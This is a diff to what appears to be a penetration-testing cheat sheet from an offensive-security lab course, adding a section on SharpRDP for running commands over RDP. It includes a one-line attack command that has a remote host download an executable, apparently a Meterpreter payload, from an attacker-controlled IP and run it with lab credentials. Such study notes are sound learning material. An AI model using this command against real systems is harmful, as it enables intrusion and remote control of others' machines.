@@ -75,4 +75,13 @@ sudo proxychains rdesktop 192.168.120.10
 [https://0xdf.gitlab.io/cheatsheets/chisel](https://0xdf.gitlab.io/cheatsheets/chisel)
 
 
+### RDP as console
+
+Can use sharprdp to execute commands on a PC using RDP protocol from command line.  
+SharpRDP is located on offsec labs in C:\tools or can be downloaded and compiled from the interwebs.  
+
+```bash
+sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
+```
+
 
